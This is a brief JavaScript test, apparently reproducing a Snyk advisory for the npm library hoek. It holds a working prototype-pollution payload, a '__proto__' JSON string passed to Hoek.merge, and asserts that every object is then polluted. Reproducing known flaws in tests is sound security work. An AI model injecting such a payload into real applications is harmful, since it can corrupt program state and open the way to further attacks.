//https://snyk.io/vuln/npm:hoek:20180212
test("prototype pollution in hoek", () => {
  const Hoek = require("hoek");
  obj = {};
  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  expect({}.polluted).toBe(undefined);

  Hoek.merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe("yes");
});
